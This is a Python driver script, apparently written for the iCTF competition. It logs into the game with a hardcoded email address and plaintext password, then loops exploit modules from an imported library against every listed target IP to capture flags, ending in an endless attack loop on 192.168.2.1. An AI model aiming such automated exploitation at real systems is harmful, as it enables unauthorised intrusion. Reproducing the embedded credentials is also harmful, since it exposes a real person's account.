from exploit_scripts import *

from ictf.client import Team
from ictf.client import iCTF
import time
import pdb
password = "2T47WGXNbhRMWwkz"
email = "thomas.sigler.15@ucl.ac.uk"

ctf = iCTF()
#Gets the team method
team = ctf.login(email, password)

#Gets a list of all services in the game
pdb.set_trace()
all_services = team.get_service_list()

for service in all_services:
	#List of all targets with a specific service
	targets_with_service = team.get_targets(str(service['service_name']))

	service_exploit = get_exploit(service)

	#If the exploit exists then for Loop
	if(service_exploit):
		for target in targets_with_service:
			flag_id = target["flag_id"]
			ip      = target["ip"]
			service_exploit.exploit(ip, service_exploit.get_port() , flag_id)


exploits = get_all_exploits()
while(True):
	time.sleep(1)

	#

	for exp_inst in exploits:
		exp_inst.exploit(ip="192.168.2.1",port="80",flag_id="1xoijaAgGz")



